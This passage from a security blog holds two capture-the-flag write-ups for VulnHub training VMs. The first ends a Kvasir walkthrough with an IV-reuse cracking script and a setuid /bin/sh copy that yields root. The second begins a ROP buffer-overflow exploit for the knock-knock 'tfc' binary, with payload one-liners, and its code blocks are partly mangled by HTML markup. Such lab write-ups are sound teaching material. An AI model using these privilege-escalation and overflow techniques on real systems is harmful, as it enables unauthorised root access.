    s.send("E "+"\xFF"*12 + "\n")   # ask to encrypt this message (12 x "0xFF", easy to reverse)
    response = s.recv(256).strip()  # grab response

    parts = response.split(":")     # split it
    if parts[0] in lookup.keys():   # check if the IV is already seen before
        k1 = int(parts[1], 16)      # JACKPOT! convert string to hex
        k2 = int(lookup[parts[0]], 16)  # convert string to hex
        d1 = k1 ^ k2    # xor the encrypted secret &amp; encrypted message
        d2 = d1 ^ 0xffffffffffffffffffffffff    # xor with plaintext "message"
        key = hex(d2)[2:-1] # output of hex() is "0x...L", but .decode() doesn't want those chars
        print key                   # debug output...
        print key.decode("hex") # output decrypted secret!!
        keepgoing = 0   # stop the loop. we're done!
s.close()   # close socket. be nice.
</code></pre>

<p>This literally cracks it in seconds:</p>

<pre><code class="bash">kefka@adm:~$ sudo /opt/wep2.py &amp;
[1] 1565
kefka@adm:~$ time python solve.py 
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')


305736553676774734573156
0W6U6vwG4W1V

real    0m3.003s
user    0m0.780s
sys 0m0.776s
</code></pre>

<p>So we&rsquo;re given another password, <code>0W6U6vwG4W1V</code>. It&rsquo;s not the root password, there are no encrypted flags on the box&hellip; what should I do with this? This had me stumped for a while. Out of pure desperation, I entered it into the <code>/opt/wep2.py</code> service:</p>

<pre><code class="bash">kefka@adm:~$ sudo /opt/wep2.py &amp;
[1] 1583
kefka@adm:~$ nc localhost 1234
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

0W6U6vwG4W1V
&gt; id
&gt; whoami
Traceback (most recent call last):
  File "&lt;string&gt;", line 1, in &lt;module&gt;
NameError: name 'whoami' is not defined
&gt;
</code></pre>

<p>Wut? Could this be a python shell?</p>

<pre><code class="bash">&gt; import os; os.system("/bin/cp /bin/sh /tmp/shell; chmod 4777 /tmp/shell")
&gt; ^C
kefka@adm:~$ Traceback (most recent call last):
  File "/opt/wep2.py", line 94, in &lt;module&gt;
    handler(sock, addr)
  File "/opt/wep2.py", line 74, in handler
    sock.send(p1)
socket.error: [Errno 32] Broken pipe

[1]+  Exit 1                  sudo /opt/wep2.py
kefka@adm:~$ ls /tmp
capture.log  shell
kefka@adm:~$ /tmp/shell
# id 
uid=1001(kefka) gid=1001(kefka) euid=0(root) groups=0(root),1001(kefka)
# whoami
root
</code></pre>

<p>Heck yes! Final troll by Rasta Mouse:</p>

<pre><code class="bash"># ls -al /root
total 32
drwx------  3 root root 4096 Sep 28 21:11 .
drwxr-xr-x 22 root root 4096 Aug  9 15:38 ..
drwx------  2 root root 4096 Aug 13 18:17 .aptitude
-rw-------  1 root root   87 Sep 28 11:55 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-r--------  1 root root  690 Sep 28 21:09 flag
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-------  1 root root 1641 Sep 28 11:47 .viminfo
# cat /root/flag
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' &lt;    \ I /  / _` |   (_-&lt;     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
gur Zrnq bs Cbrgel...

Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.

Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.

  enfgn_zbhfr(@_EnfgnZbhfr)
# cat /root/flag | tr 'n-za-mN-ZA-M' 'a-zA-Z'
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' &lt;    \ V /  / _` |   (_-&lt;     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Congratulations on beating Kvasir - I hope you enjoyed
the ride.  Take his blood, mix with honey and drink 
the Mead of Poetry...

Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.

Feel free to ping me with thoughts/comments on
http://wi-fu.co.uk, #VulnHub IRC or Twitter.

  rasta_mouse(@_RastaMouse)
</code></pre>

<p>Yes! Done! I enjoyed this VM very much. Many many thanks to <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a> for this awesome VM and of course <a href="http://vulnhub.com">g0tmi1k</a> for hostin it!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rop-rop for Knock-knock]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/"/>
    <updated>2014-10-16T19:37:39+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock</id>
    <content type="html"><![CDATA[<p>I couldn&rsquo;t resist to make a ROP exploit for <code>tfc</code>, the last binary to root <a href="http://vulnhub.com/entry/knock-knock-11,105/">knock-knock</a>.</p>

<!--more-->


<p>I really like return-oriented-programming and I love to practice it! After seeing the awesome writeups for knock-knock by <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a>, <a href="https://blog.techorganic.com/2014/10/15/knock-knock-hacking-challenge/">superkojiman</a> and <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>, I was itching to see if I could pull a ROP exploit off. I knew about the buffer overflow, but what would I need to re-use code present in the binary? There are many &lsquo;types&rsquo; of ROP, such as <code>ret2libc</code> and chaining of so-called ROP gadgets. I first checked if there were enough gadgets to pull something off, like spawning a shell. <code>radare2</code> now has a nice feature where you can search for ROP gadgets with <code>/R</code>. Furthermore, <code>gdb-peda</code> has an awesome ROP gadget search function. Lastly, I <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">built a custom ROP gadget dumper</a>. Not the most elegant solution, but it gives me a file I can <code>cat</code> and <code>grep</code>. Unfortunately, the amount of gadgets was only 107 and they weren&rsquo;t really useful, either. Back to the drawing board!</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;sample output of ropgadgets.py&lt;/h1&gt;

&lt;p&gt;RET: 0x8048921: add cl, cl<span class="p">;</span> ret<span class="p">;</span>
RET: 0x804891f: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span>
CALL_REG: 0x8048917: and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span>
CALL_REG: 0x8048911: dec dword <span class="o">[</span>ebx+0x489f045<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span>
JMP_REG: 0x8048753: and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
JMP_REG: 0x804874d: fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
JMP_REG: 0x804874b: and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
JMP_REG: 0x804874a: inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
JMP_REG: 0x8048748: add edi, eax<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
JMP_REG: 0x8048747: rol byte <span class="o">[</span>ecx<span class="o">]</span>, 0xc7<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span>
RET: 0x80486e3: add cl, cl<span class="p">;</span> ret<span class="p">;</span>
RET: 0x80486e1: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span>
RET: 0x8048615: dec ecx<span class="p">;</span> ret<span class="p">;</span>&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>There are more ways to go about this problem. We want to do something that will lead to a root shell, without actually executing shellcode on the stack. But without enough gadgets, we&rsquo;re left with not much else. But wait! We still have access to the functions that the binary uses.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d tfc <span class="p">|</span>grep <span class="p">&amp;</span>ldquo<span class="p">;</span>.plt<span class="p">&amp;</span>rdquo<span class="p">;</span>
Disassembly of section .plt:&lt;/p&gt;

&lt;p&gt;08048430 <span class="p">&amp;</span>lt<span class="p">;</span>strcmp@plt-0x10&gt;:
 8048430:   ff <span class="m">35</span> 4c 9d <span class="m">04</span> <span class="m">08</span>       pushl  0x8049d4c
 8048436:   ff <span class="m">25</span> <span class="m">50</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d50
 804843c:   <span class="m">00</span> <span class="m">00</span>                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
    <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;

&lt;p&gt;08048440 <span class="p">&amp;</span>lt<span class="p">;</span>strcmp@plt&gt;:
 8048440:   ff <span class="m">25</span> <span class="m">54</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d54
 8048446:   <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x0</span>
 804844b:   e9 e0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;08048450 <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">read</span>@plt&gt;:
 8048450:   ff <span class="m">25</span> <span class="m">58</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d58
 8048456:   <span class="m">68</span> <span class="m">08</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x8</span>
 804845b:   e9 d0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;08048460 <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">printf</span>@plt&gt;:
 8048460:   ff <span class="m">25</span> 5c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d5c
 8048466:   <span class="m">68</span> <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x10</span>
 804846b:   e9 c0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;08048470 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_xstat@plt&gt;:
 8048470:   ff <span class="m">25</span> <span class="m">60</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d60
 8048476:   <span class="m">68</span> <span class="m">18</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x18</span>
 804847b:   e9 b0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;08048480 <span class="p">&amp;</span>lt<span class="p">;</span>puts@plt&gt;:
 8048480:   ff <span class="m">25</span> <span class="m">64</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d64
 8048486:   <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x20</span>
 804848b:   e9 a0 ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;08048490 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;strong&gt;gmon_start&lt;/strong&gt;@plt&gt;:
 8048490:   ff <span class="m">25</span> <span class="m">68</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d68
 8048496:   <span class="m">68</span> <span class="m">28</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x28</span>
 804849b:   e9 <span class="m">90</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484a0 <span class="p">&amp;</span>lt<span class="p">;</span>open@plt&gt;:
 80484a0:   ff <span class="m">25</span> 6c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d6c
 80484a6:   <span class="m">68</span> <span class="m">30</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x30</span>
 80484ab:   e9 <span class="m">80</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484b0 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_libc_start_main@plt&gt;:
 80484b0:   ff <span class="m">25</span> <span class="m">70</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d70
 80484b6:   <span class="m">68</span> <span class="m">38</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x38</span>
 80484bb:   e9 <span class="m">70</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484c0 <span class="p">&amp;</span>lt<span class="p">;</span>write@plt&gt;:
 80484c0:   ff <span class="m">25</span> <span class="m">74</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d74
 80484c6:   <span class="m">68</span> <span class="m">40</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x40</span>
 80484cb:   e9 <span class="m">60</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484d0 <span class="p">&amp;</span>lt<span class="p">;</span>strrchr@plt&gt;:
 80484d0:   ff <span class="m">25</span> <span class="m">78</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d78
 80484d6:   <span class="m">68</span> <span class="m">48</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x48</span>
 80484db:   e9 <span class="m">50</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484e0 <span class="p">&amp;</span>lt<span class="p">;</span>&lt;em&gt;_lxstat@plt&gt;:
 80484e0:   ff <span class="m">25</span> 7c 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d7c
 80484e6:   <span class="m">68</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x50</span>
 80484eb:   e9 <span class="m">40</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>&lt;/em&gt;init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;080484f0 <span class="p">&amp;</span>lt<span class="p">;</span>close@plt&gt;:
 80484f0:   ff <span class="m">25</span> <span class="m">80</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d80
 80484f6:   <span class="m">68</span> <span class="m">58</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          push   <span class="nv">$0x58</span>
 80484fb:   e9 <span class="m">30</span> ff ff ff          jmp    <span class="m">8048430</span> <span class="p">&amp;</span>lt<span class="p">;</span>_init+0x2c&gt;&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>We can re-use <code>open</code>, <code>read</code> and <code>write</code> to basically read and write any file we want! I began to write a basic Proof of Concept ROP chain. This chain would simply write to a file descriptor that is already open. These file descriptors are incremented every time a file is opened and therefore guessable. This will help later on, when we open our own files. Without gadgets, it is hard to pass values from one function call to the next&hellip; Luckily, 0x0 through 0x2 are used for stdin, stdout and stderr, and any file that is opened after that gets 0x3. The next one gets 0x4, and so on. This means that <code>in.tfc</code> is 0x3 and <code>out.tfc</code> is 0x4.</p>

<p>I searched for the address of <code>write@plt</code> which turned out to be <code>0x80484c0</code>. I leveraged my buffer overflow from before to take control of code execution. We supply a large input of at least 4124 bytes. The buffer overflows, the return address on the stack is overwritten with the address of <code>write</code>. When the <code>ret</code> statement executes, we take control of code execution. Because the address points to <code>write</code>, this function will be executed using values conveniently placed on the stack. So at the point of gaining control of <code>eip</code>:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">AAAA</span>
<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">FAKE</span>        <span class="err">#</span> <span class="n">fake</span> <span class="k">return</span> <span class="n">address</span> <span class="k">for</span> <span class="n">when</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">complets</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>I ran this through the encryption Python script and fed the output to <code>tfc</code>:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*4124 + <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>c0<span class="se">\x</span>84<span class="se">\x</span>04<span class="se">\x</span>08AAAA<span class="se">\x</span>04<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>b0<span class="se">\x</span>88<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="p">&amp;</span>rdquo<span class="p">;&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> python ./enc.py
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc test5.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>xxd test5.tfc
0000000: 8b45 ec&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>Success! The three bytes from the buffer are written into <code>test5.tfc</code>. This isn&rsquo;t very useful yet, so I decided to create my own file first. This way, we can specify permissions, such as having the SUID bit set! The plan, in very ugly pseudo-code, is:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;p&gt;file1 <span class="o">=</span> open<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file1<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>w<span class="p">&amp;</span>rsquo<span class="p">;</span>, 04777<span class="o">)</span>
<span class="nv">file2</span> <span class="o">=</span> open<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file2<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>r<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>
<span class="nb">read</span><span class="o">(</span>file2, <span class="p">&amp;</span>amp<span class="p">;</span>buf, sizeof<span class="o">(</span>file2<span class="o">))</span>
write<span class="o">(</span>file1, <span class="p">&amp;</span>amp<span class="p">;</span>buf, sizeof<span class="o">(</span>file1<span class="o">))</span>&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>I&rsquo;ll go step by step. First, let&rsquo;s open our own file. The functions <a href="http://linux.die.net/man/2/open">open</a> and <a href="http://linux.die.net/man/2/write">write</a> look like this:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p>There are several challenges here. First, we cannot specify our own filename, because we cannot pass strings to the program and know where they&rsquo;ll end up on the stack. Second, we can&rsquo;t pass the filehandle around. Third, I have no clue how <code>flags</code> and <code>mode</code> work, in binary. Fourth, we need some way to clean up the stack so we can chain these libc calls together.</p>

<p>Overcoming the first challenge is easy. <code>tfc</code> contains several strings which we can re-use. I chose &lsquo;read&rsquo; as I though it was fitting. It&rsquo;s located at <code>0x8049315</code>. For the output file, I already looked up the location of &lsquo;write&rsquo; at <code>0x804933e</code>. I then proceeded to make a small binary, to get the values for <code>flags</code> and <code>mode</code>:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">stat</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">test</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h2&gt;bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d a.out <span class="p">|</span>grep open -B4&lt;/h2&gt;

&lt;p&gt;  400579:   ba ed <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x9ed</span>,%edx
  40057e:   be <span class="m">41</span> <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x441</span>,%esi
  400583:   bf <span class="m">34</span> <span class="m">06</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400634</span>,%edi
  400588:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
  40058d:   e8 ce fe ff ff          callq  <span class="m">400460</span> <span class="p">&amp;</span>lt<span class="p">;</span>open@plt&gt;&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>Finally, cleaning up the stack is necessary. After the first call to open, the stack would look like this:</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

